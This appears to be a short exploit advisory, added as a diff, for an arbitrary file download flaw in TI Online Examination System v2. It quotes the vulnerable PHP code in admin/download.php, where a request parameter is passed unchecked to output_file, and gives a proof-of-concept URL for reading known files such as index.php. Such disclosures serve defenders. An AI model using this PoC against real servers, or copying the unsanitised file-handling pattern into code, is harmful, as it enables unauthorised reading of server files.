@@ -1,0 +1,30 @@
+# Exploit Title: TI Online Examination System v2 - Arbitrary File Download
+# Dork: N/A
+# Date: 02.08.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/ti-online-examination-system-v2/11248904
+# Version: 2.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : The "Export" operation in the admin panel is vulnerable.
+The attacker can download and read all files known by the name via
+"download.php"
+
+====================================================
+
+# Demo : server/admin/
+# Vuln file : /admin/download.php
+
+115. $data_action    = $_REQUEST['action'];
+116. if($data_action == 'downloadfile')
+117. {
+118.    $file   = $_REQUEST['file'];
+119.    $name    = $file;
+120.    $result = output_file($file, $name);
+
+# PoC :
+http://server/admin/download.php?action=downloadfile&file=[filename]
+you can write the known file name instead of [filename]. For Example:
+'download.php' or 'index.php'
+
+====================================================
